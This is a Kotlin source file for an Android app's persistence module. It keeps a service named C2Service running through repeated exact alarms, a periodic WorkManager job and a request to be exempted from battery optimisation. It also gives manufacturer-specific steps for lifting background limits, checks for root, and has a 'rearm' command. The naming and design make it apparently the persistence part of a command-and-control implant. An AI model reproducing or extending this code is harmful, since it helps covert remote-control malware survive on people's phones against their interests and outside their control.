package ai.obsidian.agent.persist

import ai.obsidian.agent.AgentApp
import ai.obsidian.agent.root.Shell
import ai.obsidian.agent.svc.C2Service
import android.app.AlarmManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.Worker
import androidx.work.WorkerParameters
import java.util.concurrent.TimeUnit

object Ladder {

    fun arm(context: Context) {
        scheduleAlarm(context, ALARM_INTERVAL_MILLIS)
        WorkManager.getInstance(context).enqueueUniquePeriodicWork(
            WORK_NAME,
            ExistingPeriodicWorkPolicy.UPDATE,
            PeriodicWorkRequestBuilder<KeepAliveWorker>(15, TimeUnit.MINUTES).build()
        )
    }

    fun scheduleAlarm(context: Context, delayMillis: Long) {
        val manager = context.getSystemService(AlarmManager::class.java) ?: return
        val pending = PendingIntent.getBroadcast(
            context,
            REQUEST_CODE,
            Intent(context, AlarmReceiver::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        val triggerAt = System.currentTimeMillis() + delayMillis
        runCatching {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && !manager.canScheduleExactAlarms()) {
                manager.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pending)
            } else {
                manager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pending)
            }
        }.onFailure {
            manager.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pending)
        }
    }

    fun requestDozeExemption(context: Context): String {
        val power = context.getSystemService(PowerManager::class.java)
        if (power.isIgnoringBatteryOptimizations(context.packageName)) return "already exempt"
        runCatching {
            context.startActivity(
                Intent(
                    android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:${context.packageName}")
                ).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            )
        }
        return "requested (user must confirm)"
    }

    fun status(context: Context): String {
        val power = context.getSystemService(PowerManager::class.java)
        val alarms = context.getSystemService(AlarmManager::class.java)
        val manufacturer = Build.MANUFACTURER.lowercase()

        return buildString {
            appendLine("oem=$manufacturer")
            appendLine("doze_exempt=${power.isIgnoringBatteryOptimizations(context.packageName)}")
            appendLine("device_idle=${power.isDeviceIdleMode}")
            appendLine("power_save=${power.isPowerSaveMode}")
            appendLine("standby_bucket=${power.appStandbyBucket}")
            appendLine("exact_alarms=${if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) alarms.canScheduleExactAlarms() else true}")
            appendLine("root=${Shell.rootAvailable()}")
            appendLine("rung=${(context.applicationContext as AgentApp).cfg.rung}")
            append("ACTION: ")
            append(
                when (manufacturer) {
                    "samsung" -> "Battery > Background usage limits > remove from Sleeping apps"
                    "xiaomi", "redmi", "poco" -> "Security > Permissions > Autostart ON; Battery > No restrictions"
                    "huawei", "honor" -> "Battery > App launch > Manage manually, all toggles ON"
                    "oppo", "realme", "oneplus", "vivo" -> "Battery > App battery management > Allow background activity"
                    else -> "none required on AOSP-like builds"
                }
            )
        }
    }

    fun control(context: Context, sub: String): String = when (sub) {
        "rearm" -> {
            arm(context)
            C2Service.start(context)
            "re-armed"
        }
        "doze-exempt" -> requestDozeExemption(context)
        "battery", "status" -> status(context)
        else -> "persist status|rearm|doze-exempt|battery"
    }

    private const val WORK_NAME = "obsidian.keepalive"
    private const val REQUEST_CODE = 7001
    private const val ALARM_INTERVAL_MILLIS = 60_000L
}

class KeepAliveWorker(context: Context, parameters: WorkerParameters) :
    Worker(context, parameters) {

    override fun doWork(): Result {
        C2Service.start(applicationContext)
        Ladder.scheduleAlarm(applicationContext, 60_000L)
        return Result.success()
    }
    }
